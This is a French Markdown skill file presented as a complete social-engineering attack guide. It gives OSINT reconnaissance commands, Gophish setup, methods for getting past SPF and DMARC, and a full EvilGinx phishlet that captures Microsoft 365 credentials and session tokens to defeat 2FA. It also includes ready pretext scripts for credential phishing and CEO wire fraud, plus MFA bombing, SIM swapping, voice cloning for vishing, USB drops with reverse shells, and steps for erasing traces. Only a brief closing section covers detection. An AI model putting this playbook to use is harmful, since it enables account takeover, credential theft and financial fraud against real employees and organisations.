---
name: social-engineering
description: Social Engineering — phishing, pretexting, vishing, OSINT pré-attaque, Gophish, EvilGinx, frameworks, et ingénierie sociale technique
tags: [social-engineering, phishing, pretexting, vishing, OSINT, Gophish, EvilGinx, SE]
version: 1.0
---

# Social Engineering

Guide complet d'ingénierie sociale — de la reconnaissance à l'exploitation psychologique, phishing avancé, et contournement de la sécurité humaine.

## 1. Phases de l'Attaque SE

### Phase 1 : OSINT (Reconnaissance)
```bash
# Collecter informations sur la cible
# LinkedIn, Facebook, Twitter, Instagram, Telegram
# Emails publics, docs, photos, métadonnées

# Outils OSINT
theHarvester -d target.com -b linkedin,google,github
sherlock username
maigret username
holehe email@target.com
```

### Phase 2 : Prétexting
```
# Créer un personnage crédible
# - IT support, new employee, vendor, partner
# - Utiliser les infos OSINT pour crédibilité
# - Appels téléphoniques (vishing) ou emails (phishing)
```

### Phase 3 : Exécution
```
# - Déclencher l'action (clic, credential, transfert)
# - Capturer les données
# - Escalade si nécessaire
```

### Phase 4 : Post-exploitation
```
# - Utiliser credentials pour pivoter
# - Maintenir accès
# - Effacer traces
```

## 2. Phishing Infrastructure

### Gophish — Framework Phishing
```bash
# Install
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
cd gophish-v0.12.1-linux-64bit

# Config
nano config.json
# listening_port: 3333
# admin_server: 0.0.0.0:3334

# Lancement
./gophish
# Admin : https://localhost:3334 (default admin:gophish)
```

### Email Spoofing & Delivery
```bash
# SPF, DKIM, DMARC bypass
# 1. Vérifier les enregistrements DNS
dig TXT _dmarc.target.com
dig TXT target.com | grep spf
dig TXT google._domainkey.target.com

# 2. Bypass SPF
# Si SPF=~all (softfail) → spoofing possible
# Si SPF=-all (hardfail) → utiliser un sous-domaine non listé
# Utiliser un VPS avec IP non listée dans SPF

# 3. SMTP relaying
# Si serveur SMTP n'a pas de vérification SPF
# Envoyer via un serveur SMTP local
```

### EvilGinx — Reverse Proxy
```bash
# Install
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
./bin/evilginx -p phishlets/

# Configurer un phishlet (ex: Microsoft 365)
cat > phishlets/microsoft.yaml << 'EOF'
name: 'microsoft'
author: 'kgretzky'
min_ver: '3.0.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: false}
sub_filters:
  - {hostname: 'login.microsoftonline.com', keyword: 'wp/', replace: 'wp/'}
  - {hostname: 'login.microsoftonline.com', keyword: 'callback/', replace: 'callback/'}
auth_tokens:
  - domain: 'login.microsoftonline.com'
    keys: ['nonce', 'state', 'sessionid', 'code']
credentials:
  - type: 'username'
    selector: 'input[name="loginfmt"]'
  - type: 'password'
    selector: 'input[name="passwd"]'
login:
  domain: 'login.microsoftonline.com'
  auth_url: 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=...'
EOF

# Configurer le domaine
evilginx> config domain yourdomain.com
evilginx> config ip YOUR_SERVER_IP
evilginx> phishlets hostname microsoft login.yourdomain.com
evilginx> phishlets geturl microsoft
evilginx> sessions  # Voir les sessions capturées
```

### Modlishka (Proxy Phishing)
```bash
# Reverse proxy 2FA-aware
# MitM automatique avec cookie replication
# Support : Google, Facebook, Microsoft, LinkedIn

git clone https://github.com/drk1wi/Modlishka
cd Modlishka
make
./bin/Modlishka -config config.json
```

## 3. Vishing (Voice Phishing)

### Deepfake Voice
```bash
# Synthèse vocale avec AI
# - Coqui TTS : fine-tuning sur voix cible
# - ElevenLabs : voice cloning (5 min audio)
# - Bark : text-to-speech avancé

# Appel automatisé
# - Twilio API : programmable voice
# - Asterisk : PBX open source
# - SIPp : SIP protocol testing
```

### Caller ID Spoofing
```bash
# Spoof CID via SIP trunk
# Protocoles : SIP, PRI, SS7 (ancien)
# Outils : sipvicious, SIPp, Asterisk
```

## 4. Phishing Kits

### Microsoft 365 / Google Workspace
```bash
# Page de login factice copiant l'originale
# CSS + JS pour ressemblance parfaite
# Submission : POST vers serveur attaquant
# Redirection vers vraie page après capture

# Kits prêts :
# - https://github.com/OWASP/PhishEye
# - https://github.com/mandiant/PhishingKitTracker
```

### 2FA Bypass Techniques
```bash
# 1. OTP forwarding (realtime)
# - EvilGinx / Modlishka : proxy en temps réel
# - Capturer cookie OAuth après 2FA

# 2. Push notification fatigue
# - Envoyer multiples push notifications
# - Victime accepte par lassitude (MFA bombing)

# 3. Sim swapping
# - Social engineering opérateur téléphonique
# - Prendre contrôle SMS → reset 2FA

# 4. Recovery codes
# - Phishing du recovery flow
# - "Your account was compromised, verify here"
```

## 5. Pretexting Scénarios

### IT Support
```
Persona : "John from IT Support"
Story : "We're updating the password policy for security compliance"
Action : "Please verify your current credentials at portal.company.com/verify"
Target : HR, finance, executives
```

### Supplier/Vendor
```
Persona : "Jane from auditing firm"
Story : "Annual vendor compliance review"
Action : "Download the updated forms from our secure portal"
Attachment : Malicious PDF with macro
```

### Executive Impersonation (CEO Fraud)
```
Persona : "CEO/President"
Story : "Urgent wire transfer needed for acquisition"
Action : "Transfer $50,000 to account XY, confirm by email"
Target : CFO, finance department
```

### HR / Benefits
```
Persona : "HR Benefits Coordinator"
Story : "Open enrollment period — update your benefits"
Action : "Click link to login to benefits portal"
Target : All employees
```

## 6. Watering Hole Attack

```bash
# Compromettre un site visité par la cible
# 1. Identifier les sites visités (OSINT, Alexa, SimilarWeb)
# 2. Trouver vulnérabilité sur le site
# 3. Injecter exploit (drive-by download, redirect)
# 4. Quand cible visite → infection

# Exploit kits utilisés
# - RIG EK
# - Fallout EK
# - Spelevo EK
```

## 7. Physical SE

### Tailgating / Piggybacking
```
# Suivre un employé dans un bâtiment sécurisé
# - Avec les mains chargées (excuse classique)
# - "I forgot my badge"
# - Smoking area entrance
```

### USB Drop Attack
```bash
# Laisser des clés USB infectées dans le parking
# - Rubber Ducky (HID keystroke injection)
# - BadUSB (firmware modifié)
# - Teensy / Pico-device
# - USB killer (hardware only)

# EXFIL-USB
# - Auto-exfiltration des fichiers sur clé
# - Reverse shell sur connexion
```

## 8. Social Engineering Toolkit (SET)

```bash
# Install
git clone https://github.com/trustedsec/social-engineer-toolkit
cd set
python3 setup.py install

# Menu principal
set> 1) Social-Engineering Attacks
set> 2) Website Attack Vectors
set> 3) Credential Harvester Attack Method
set> 4) Site Cloner
```

## 9. Détection et Contre-mesures

### Blue Team : Détection Phishing
```bash
# Analyse email headers
# - SPF/DKIM/DMARC alignment
# - Reply-to mismatch
# - Sender domain vs. display name

# Analyse URL
# - Homograph attack (pàypal.com)
# - IDN spoofing (xn--paypal-...)
# - URL shortener abuse

# Behavioural
# - New location sign-in
# - Impossible travel
# - Suspicious OAuth consent
```

### Tools de Détection
```bash
# PhishEye (OWASP)
# PhishTank API
# urlscan.io
# VirusTotal URL scan
# PhishingKitTracker (Mandiant)
```

## 10. Ressources

- **Social-Engineer Toolkit (SET)** : https://github.com/trustedsec/social-engineer-toolkit
- **Gophish** : https://getgophish.com
- **EvilGinx2** : https://github.com/kgretzky/evilginx2
- **Modlishka** : https://github.com/drk1wi/Modlishka
- **Framework SE** : https://www.social-engineer.org/framework
- **PhishingKitTracker** : https://github.com/mandiant/PhishingKitTracker
- **PhishEye** : https://github.com/OWASP/PhishEye
- **The Art of Deception** : Kevin Mitnick (book)